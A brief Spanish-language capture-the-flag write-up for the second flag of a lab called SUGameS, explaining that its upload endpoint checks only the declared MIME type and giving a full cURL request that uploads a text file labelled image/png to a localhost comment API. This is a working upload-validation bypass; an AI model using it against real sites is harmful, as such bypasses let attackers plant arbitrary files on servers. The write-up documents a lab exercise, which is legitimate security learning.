## WriteUp segunda flag SUGameS

- Hay que conseguir subir un archivo que no sea una imagen. La vulnerabilidad consiste en que el servidor únicamente comprueba el tipo MIME del archivo, no comprueba la extensión real, con lo que podemos subir cualquier tipo de archivo cambiando el Content-Type del formulario mediante una petición cURL.

### Windows

- Este comando envía una petición al endpoint, subiendo un archivo que no es una imagen.

```bash
archivo="vacio.txt"
curl 'http://localhost/api/comment/Elden%20Ring' \
  -H 'Accept: */*' \
  -H 'Accept-Language: es-ES,es' \
  -H 'Connection: keep-alive' \
  -H 'Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryj1AO1KcqRoQqwFBQ' \
  -H 'Origin: http://localhost' \
  -H 'Referer: http://localhost/' \
  -H 'Sec-Fetch-Dest: empty' \
  -H 'Sec-Fetch-Mode: cors' \
  -H 'Sec-Fetch-Site: same-origin' \
  -H 'Sec-GPC: 1' \
  -H 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36' \
  -H 'sec-ch-ua: "Not A(Brand";v="99", "Brave";v="121", "Chromium";v="121"' \
  -H 'sec-ch-ua-mobile: ?0' \
  -H 'sec-ch-ua-platform: "Windows"' \
  --data-binary $'------WebKitFormBoundaryj1AO1KcqRoQqwFBQ\r\nContent-Disposition: form-data; name="game"\r\n\r\nElden Ring\r\n------WebKitFormBoundaryj1AO1KcqRoQqwFBQ\r\nContent-Disposition: form-data; name="text"\r\n\r\nHola mundo\r\n------WebKitFormBoundaryj1AO1KcqRoQqwFBQ\r\nContent-Disposition: form-data; name="image"; filename="vacio.txt"\r\nContent-Type: image/png\r\n\r\n'$archivo$'\r\n------WebKitFormBoundaryj1AO1KcqRoQqwFBQ--\r\n' \
  --compressed
```